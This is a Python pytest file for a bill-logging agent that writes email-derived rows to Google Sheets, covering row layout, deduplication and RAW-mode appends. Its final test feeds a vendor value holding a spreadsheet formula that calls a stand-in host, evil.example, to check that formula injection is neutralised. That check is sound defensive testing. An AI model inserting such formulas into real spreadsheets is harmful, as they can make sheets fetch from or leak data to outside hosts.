from datetime import UTC, date, datetime
from decimal import Decimal
from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest

from agent.schemas import Bill, Category, Email
from agent.sheets_client import HEADER, SheetsClient, build_row, email_link


def make_email(mid="m1", received=datetime(2026, 11, 7, 9, 30, tzinfo=UTC)) -> Email:
    return Email(
        id=mid,
        thread_id=f"t-{mid}",
        sender="HDFC Bank <statements@hdfcbank.net>",
        subject="Statement",
        received_at=received,
    )


def make_bill(**kwargs) -> Bill:
    defaults = {
        "vendor": "HDFC Bank",
        "amount": Decimal("12500.50"),
        "currency": "INR",
        "due_date": date(2026, 12, 5),
        "confidence": 0.9,
    }
    return Bill(**{**defaults, **kwargs})


def test_bill_row_follows_the_agreed_columns():
    row = build_row(make_email(), Category.BILLS, make_bill())
    assert HEADER == [
        "Date received",
        "Type",
        "Biller",
        "Amount",
        "Currency",
        "Due date",
        "Status",
        "Email link",
    ]
    assert row == [
        "2026-11-07",
        "bill",
        "HDFC Bank",
        12500.5,
        "INR",
        "2026-12-05",
        "unpaid",
        "https://mail.google.com/mail/u/0/#all/m1",
    ]


def test_receipt_row_is_paid_with_no_due_date():
    row = build_row(make_email(), Category.RECEIPTS, make_bill(due_date=None))
    assert row[1] == "receipt" and row[5] == "" and row[6] == "paid"


def test_low_confidence_row_is_flagged_for_a_check():
    row = build_row(make_email(), Category.BILLS, make_bill(confidence=0.69))
    assert row[6] == "check"


def test_missing_received_date_is_left_blank():
    row = build_row(make_email(received=None), Category.BILLS, make_bill())
    assert row[0] == ""


def test_only_bills_and_receipts_can_become_rows():
    with pytest.raises(ValueError, match="bills or receipts"):
        build_row(make_email(), Category.NEWSLETTERS, make_bill())


def fake_sheets(header=None, links=None):
    """A stand-in Sheets service. `header`/`links` are what the sheet already holds."""
    service = MagicMock()
    values = service.spreadsheets.return_value.values.return_value
    answers = {
        "A1:H1": {"values": [header]} if header else {},
        "H2:H": {"values": [[x] for x in links]} if links else {},
    }
    values.get.side_effect = lambda **kw: SimpleNamespace(
        execute=lambda: answers[kw["range"]]
    )
    return service, values


def client(service) -> SheetsClient:
    return SheetsClient(service, "sheet-1")


def test_email_link_is_a_gmail_deep_link():
    assert email_link("abc") == "https://mail.google.com/mail/u/0/#all/abc"


def test_header_is_written_only_when_the_sheet_is_empty():
    service, values = fake_sheets(header=None)
    client(service).ensure_header()
    values.update.assert_called_once()
    kwargs = values.update.call_args.kwargs
    assert kwargs["range"] == "A1:H1"
    assert kwargs["valueInputOption"] == "RAW"
    assert kwargs["body"] == {"values": [HEADER]}

    service, values = fake_sheets(header=HEADER)
    client(service).ensure_header()
    values.update.assert_not_called()


def test_logged_email_ids_are_read_back_from_the_link_column():
    links = [email_link("a1"), "", email_link("b2")]
    service, _ = fake_sheets(header=HEADER, links=links)
    assert client(service).logged_email_ids() == {"a1", "b2"}


def test_logged_email_ids_of_an_empty_sheet_is_empty():
    service, _ = fake_sheets(header=HEADER)
    assert client(service).logged_email_ids() == set()


def test_log_bills_appends_only_new_rows_in_one_raw_call():
    service, values = fake_sheets(header=HEADER, links=[email_link("old")])
    items = [
        (make_email("old"), Category.BILLS, make_bill()),
        (make_email("new1"), Category.BILLS, make_bill()),
        (make_email("new2"), Category.RECEIPTS, make_bill(due_date=None)),
    ]
    appended = client(service).log_bills(items)
    assert appended == ["new1", "new2"]
    values.append.assert_called_once()
    kwargs = values.append.call_args.kwargs
    assert (
        kwargs["valueInputOption"] == "RAW"
    )  # never USER_ENTERED: no formula injection
    assert [r[7] for r in kwargs["body"]["values"]] == [
        email_link("new1"),
        email_link("new2"),
    ]


def test_log_bills_with_nothing_new_makes_no_append_call():
    service, values = fake_sheets(header=HEADER, links=[email_link("old")])
    assert (
        client(service).log_bills([(make_email("old"), Category.BILLS, make_bill())])
        == []
    )
    values.append.assert_not_called()


def test_log_bills_writes_the_header_first_on_an_empty_sheet():
    service, values = fake_sheets(header=None)
    client(service).log_bills([(make_email(), Category.BILLS, make_bill())])
    values.update.assert_called_once()
    values.append.assert_called_once()


def test_a_formula_like_vendor_is_sent_as_plain_text():
    service, values = fake_sheets(header=HEADER)
    bill = make_bill(vendor='=IMPORTXML("http://evil.example","//a")')
    client(service).log_bills([(make_email(), Category.BILLS, bill)])
    kwargs = values.append.call_args.kwargs
    assert kwargs["valueInputOption"] == "RAW"
    assert kwargs["body"]["values"][0][2] == bill.vendor
